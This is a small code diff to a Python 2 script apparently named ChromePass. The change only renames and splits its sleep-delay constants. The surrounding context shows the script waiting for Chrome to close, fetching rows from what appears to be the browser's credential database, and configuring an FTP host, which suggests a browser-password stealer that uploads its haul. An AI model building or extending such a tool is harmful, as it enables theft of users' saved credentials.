@@ -14,7 +14,10 @@ except:
 
 
 # waiting time to verify internet connection
-DELAY_SLEEP = 60
+DELAY_SLEEP_INTERNET = 60
+
+# Wait time to verify that the browser is closed
+DELAY_SLEEP_BROWSER = 60
 
 # ftp server address
 HOST_FTP = "ftp.yourHost.com"
@@ -56,7 +59,7 @@ class ChromePass:
 
 			print "Waits for chrome to be closed..."
 
-			time.sleep(DELAY_SLEEP)
+			time.sleep(DELAY_SLEEP_BROWSER)
 
 		self.logs = cursor.fetchall()
 
@@ -128,7 +131,7 @@ class ChromePass:
 
 				print "Wait for an Internet connection..."
 
-				time.sleep(DELAY_SLEEP)
+				time.sleep(DELAY_SLEEP_INTERNET)
 
 		f = tempfile.TemporaryFile()
 
